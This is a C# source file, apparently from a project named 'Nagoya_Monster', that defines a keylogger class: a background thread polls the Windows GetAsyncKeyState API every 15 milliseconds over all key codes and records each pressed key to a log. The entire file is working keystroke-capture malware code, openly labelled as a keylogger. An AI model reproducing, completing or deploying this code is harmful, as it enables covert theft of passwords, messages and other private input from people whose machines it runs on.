using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Nagoya_Monster
{
    static class Keylog
    {
        public static bool IsKeylogging = true;

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int i);
        private static bool IsRunning = false;

        public static void Start()
        {
            IsKeylogging = true;
            new Thread(new ThreadStart(KeyLog)).Start();
        }

        public static void Stop()
        {
            IsKeylogging = false;
            IsRunning = false;
        }

        public static void KeyLog()
        {
			if (!IsRunning)
            {
                IsRunning = true;

                while (IsKeylogging)
                {
                    for (int i = 0; i < byte.MaxValue; ++i)
                    {
                        switch (GetAsyncKeyState(i))
                        {
                            case 1:
                            case -32767:
                                Log.Add(Convert.ToString((Keys)i));
                                break;
                        }
                    }
                    Thread.Sleep(15);
                }
            }
        }
    }
}
